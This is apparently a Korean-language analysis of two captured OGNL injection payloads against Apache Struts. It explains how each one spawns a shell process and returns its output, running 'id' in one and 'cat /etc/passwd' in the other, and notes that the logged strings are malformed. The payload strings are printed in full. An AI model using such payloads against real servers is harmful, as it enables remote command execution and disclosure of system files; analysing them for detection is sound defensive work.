## 📂**OGNL 표현식(주로 Apache Struts 계열의 OGNL 인젝션을 노린 페이로드)**  

서버에서 `sh -c id` 같은 OS 명령을 실행해 결과를 HTTP 응답으로 찍어내는 **원격 명령 실행(RCE)** 입니다. 

---

# 1) ⏳

```
redirect:${#a\=(newjava.lang.processbuilder(newjava.lang.string[]{'sh','-c','id'})).start(),#b\=#a.getinputstream(),#c\=newjava.io.inputstreamreader(#b),#d\=newjava.io.bufferedreader(#c),#e\=newchar[50000],#d.read(#e),#matt\=#context.get('com.opensymphony.xwork2.dispatcher.httpservletresponse'),#matt.getwriter().println(#e),#matt.getwriter().flush(),#matt.getwriter().close()},redirect:${,redirect:${#a\=(new java.,ProcessBuilder(newjava.lang.String[]{'sh','-c','id'})).start(),#b\=#a.getInputStream(),#c\=newjava.io.InputStreamRead
```

* `redirect:${...}` 안에 OGNL 표현식을 넣어, OGNL 평가 시 Java `ProcessBuilder` 인스턴스를 생성하고 `.start()`로 프로세스를 실행한다.
* 프로세스의 표준출력(InputStream)을 읽어 `ServletResponse`의 writer로 출력하여 HTTP 응답에 명령 결과(`id` 출력) 를 노출하려는 패턴.
* `new java.lang.ProcessBuilder(...).start()` → `getInputStream()` → `InputStreamReader` → `BufferedReader` → `read(char[])` → 써서 `response.getWriter().println(...)`.


#### 문법(유효성)

* OGNL/Java 문법상 `new java.lang.ProcessBuilder(...)` 와 같이 공백·정확한 대소문자가 필요합니다.
* `getinputstream` vs `getInputStream`, `inputstreamreader` vs `InputStreamReader` 등 카멜케이스(띄어쓰기를 하지 않고 각 단어의 첫 글자를 대문자로 붙여 쓰되, 전체 단어의 첫 글자는 대문자 또는 소문자로 쓸 수 있는 방식)가 존재해서는 안 됩니다. 

---

# 2) ⏳

```
%{#a\=(newjava.lang.processbuilder(newjava.lang.string[]{"cat","/etc/passwd"})).redirecterrorstream(true).start(),#b\=#a.getinputstream(),#c\=newjava.io.inputstreamreader(#b),#d\=newjava.io.bufferedreader(#c),#e\=newchar[50000],#d.read(#e),#f\=#context.get("com.opensymphony.xwork2.dispatcher.httpservletresponse"),#f.getwriter().println(newjava.lang.string(#e)),#f.getwriter().flush(),#f.getwriter().close()},ProcessBuilder(newjava.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b\=#a.getInputStream(
```

* OGNL/Struts RCE 변형입니다. `cat /etc/passwd`를 실행해 시스템 파일을 노출시키려는 시도이며, `%{...}` 표기 역시 Struts에서 OGNL 표현식을 감쌀 때 종종 보이는 형식입니다.
